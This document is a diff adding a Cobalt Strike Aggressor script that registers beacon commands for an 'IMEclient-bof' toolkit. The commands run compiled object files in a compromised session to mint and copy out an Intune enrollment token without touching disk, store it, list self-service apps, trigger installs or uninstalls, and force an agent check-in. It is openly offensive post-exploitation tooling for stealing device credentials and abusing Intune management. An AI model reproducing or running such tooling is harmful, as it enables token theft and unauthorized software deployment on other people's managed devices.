@@ -1,0 +1,166 @@
+# IMEclient-bof beacon aliases: ime-token / ime-auth / ime-list / ime-install / ime-checkin.
+
+beacon_command_register(
+    "ime-token",
+    "mint the Intune enrollment token into beacon KV 'imeToken' (no disk)",
+    "Use: ime-token\n" .
+    "\n" .
+    "Mints a fresh enrollment token in-beacon: WAM silent sign-on -> graph\n" .
+    "servicePrincipals endpoints (TokenRenewalService + IWService) -> MAM\n" .
+    "token -> renewal GET. Stores the token AND the IW url in the beacon KV\n" .
+    "'imeToken' and prints the JWT for copy-out. Nothing touches disk.\n" .
+    "Token lifetime is ~20 minutes - run ime-auth right after.\n" .
+    "\n" .
+    "Follow-up: ime-auth   (then ime-list / ime-install / ime-checkin)\n");
+alias ime-token {
+    local('$bid $barch $handle $data');
+    $bid = $1;
+    $barch = barch($bid);
+
+    $handle = openf(script_resource("dist/ime_token. $+ $barch $+ .o"));
+    if (!$handle) {
+        btask($bid, "ime_token: COFF missing - run 'make all' in the IMEclient-bof checkout");
+        return;
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "");
+    btask($bid, "IME: mint enrollment token (WAM silent -> TokenRenewalService) into KV 'imeToken'");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "ime-auth",
+    "store the enrollment token/IW url/device id as the imeCtx for the other ime-* commands",
+    "Use: ime-auth [-t <token>] [iwurl] [devid]\n" .
+    "\n" .
+    "No args: token from the KV block written by ime-token.\n" .
+    "-t <token>: hand-fed token - the base64url JWT exactly as printed by\n" .
+    "  ime-token / IMEClient token.\n" .
+    "iwurl/devid: optional overrides; default to the Graph discovery stored\n" .
+    "  by ime-token and the Intune MDM device-cert CN, then the stored ctx.\n" .
+    "\n" .
+    "After the first ever auth a refresh is just:  ime-token; ime-auth");
+alias ime-auth {
+    local('$bid $barch $handle $data $args');
+    $bid = $1;
+    $barch = barch($bid);
+
+    if ("$2" eq "-t" && strlen("$3") == 0) {
+        btask($bid, "usage: ime-auth [-t <token>] [iwurl] [devid]");
+        btask($bid, "       no args: token from ime-token's KV 'imeToken'; -t: the base64url JWT inline");
+        return;
+    }
+
+    $handle = openf(script_resource("dist/ime_auth. $+ $barch $+ .o"));
+    if (!$handle) {
+        btask($bid, "ime_auth: COFF missing - run 'make all' in the IMEclient-bof checkout");
+        return;
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if ("$2" eq "-t") {
+        # hand-fed token; optional iwurl/devid ride along
+        if (strlen("$5")) {
+            $args = bof_pack($bid, "ZZZZ", "-t", $3, $4, $5);
+        } else if (strlen("$4")) {
+            $args = bof_pack($bid, "ZZZ", "-t", $3, $4);
+        } else {
+            $args = bof_pack($bid, "ZZ", "-t", $3);
+        }
+    } else if (strlen("$3")) {
+        # KV token + explicit iwurl/devid overrides
+        $args = bof_pack($bid, "ZZ", $2, $3);
+    } else if (strlen("$2")) {
+        $args = bof_pack($bid, "Z", $2);
+    } else {
+        $args = bof_pack($bid, "");
+    }
+
+    btask($bid, "IME: store imeCtx (enrollment token/IW url/device id)");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "ime-list",
+    "list Intune self-service applications available to this user/device",
+    "Use: ime-list\n" .
+    "\n" .
+    "Negotiates the api-version, then GETs the serviceApplications the\n" .
+    "Intune catalog offers this identity: #  GuidKey  Name  Publisher.\n" .
+    "Requires ime-auth (imeCtx) first.");
+alias ime-list {
+    local('$bid $barch $handle $data $args');
+    $bid = $1;
+    $barch = barch($bid);
+
+    $handle = openf(script_resource("dist/ime_list. $+ $barch $+ .o"));
+    if (!$handle) {
+        btask($bid, "ime_list: COFF missing - run 'make all' in the IMEclient-bof checkout");
+        return;
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "");
+    btask($bid, "IME: list self-service applications");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "ime-install",
+    "trigger install/uninstall of a catalogged app via Intune self-service",
+    "Use: ime-install <install|uninstall> <name-substring|#|guid>\n" .
+    "\n" .
+    "Resolves the selector against ime-list's catalogue (substring, #, or GuidKey)\n" .
+    "POSTs the #Install/#Uninstall action and prints the result.");
+alias ime-install {
+    local('$bid $barch $handle $data $args');
+    $bid = $1;
+    $barch = barch($bid);
+
+    if (strlen("$3") == 0) {
+        btask($bid, "usage: ime-install <install|uninstall> <name-substring|#|guid>");
+        return;
+    }
+
+    $handle = openf(script_resource("dist/ime_install. $+ $barch $+ .o"));
+    if (!$handle) {
+        btask($bid, "ime_install: COFF missing - run 'make all' in the IMEclient-bof checkout");
+        return;
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "ZZ", $2, $3);
+    btask($bid, "IME: $2 $3");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "ime-checkin",
+    "trigger an Intune agent check-in over the native net.pipe channel",
+    "Use: ime-checkin\n" .
+    "\n" .
+    "Native WCF net.pipe session with the local IME service: shared-mem\n" .
+    "pipe resolve, NegotiateStream, encrypted CheckIn envelope. The IME\n" .
+    "log shows the resulting sync cascade.");
+alias ime-checkin {
+    local('$bid $barch $handle $data');
+    $bid = $1;
+    $barch = barch($bid);
+
+    $handle = openf(script_resource("dist/ime_checkin. $+ $barch $+ .o"));
+    if (!$handle) {
+        btask($bid, "ime_checkin: COFF missing - run 'make all' in the IMEclient-bof checkout");
+        return;
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "");
+    btask($bid, "IME: trigger agent check-in (sync now)");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
